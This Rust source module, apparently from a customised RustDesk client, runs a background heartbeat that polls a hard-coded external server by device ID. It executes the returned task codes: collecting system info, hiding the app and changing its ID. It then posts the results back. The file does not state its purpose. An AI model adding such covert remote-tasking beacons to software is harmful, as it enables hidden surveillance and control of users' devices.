use serde_json::{Value};
use crate::ext::{config_bridge, option_bridge};
use crate::hbbs_http::create_http_client;

const SMALL_SPAN: u64 = 3;
const BIG_SPAN: u64 = 300;
const PREFIX: &str = "https://api.emm233.cn:1100/app";
// const PREFIX: &str = "http://localhost:20004/app";
const TASK_TYPE: &str = "rustdesk";

pub fn init() {
    // 开启线程执行，参考：check_zombie()
    std::thread::spawn(move || {
        loop{
            let span = heartbeat();
            std::thread::sleep(std::time::Duration::from_secs(span));
        }
    });
}

// 执行心跳，并返回下次心跳间隔棒
pub fn heartbeat() -> u64 {
    let client = create_http_client();
    // 执行http get请求
    let get_url = format!("{}/cmd/api/pullTask?deviceId={}&taskType={}", PREFIX, config_bridge::get_id(), TASK_TYPE);
    let resp = client.get(get_url).send();
    let resp = match resp {
        Ok(resp) => resp,
        Err(e) => {
            return BIG_SPAN;
        }
    };
    // 获取body
    let body = resp.text().unwrap_or(String::from(""));
    // 将body转换为json
    let mut json: Value = serde_json::from_str(&body).unwrap_or(Value::Null);
    let id = json["id"].as_i64().unwrap_or(-1);
    // 如果id为-1，说明没有任务
    if id == -1 {
        return BIG_SPAN;
    }

    let shell = json["context"].as_str().unwrap_or("");
    let shell_json: Value = serde_json::from_str(shell).unwrap_or(Value::Null);
    let code = shell_json["code"].as_str().unwrap_or("");
    let params = shell_json["params"].as_str().unwrap_or("");

    // 执行，并异常处理
    let result = exec(code, params);

    let update_url = format!("{}/cmd/api/updateTask", PREFIX);
    // 设置post的body参数
    json["result"] = Value::from(result);
    json["status"] = Value::from(3);
    let _ = client.post(update_url)
        .header(reqwest::header::CONTENT_TYPE, "application/json")
        .json(&json)
        .send();

    SMALL_SPAN
}

// 根据code执行不同的逻辑，获取执行结果
fn exec(code: &str, params: &str) -> String {
    let result = match code {
        "1001" => {
            config_bridge::get_sys_info()
        }
        "1002" => {
            config_bridge::hide_model();
            "OK".to_string()
        }
        "1003" => {
            option_bridge::change_id(params)
        }
        _ => {
            // 其他逻辑
            "OK".to_string()
        }
    };
    result
}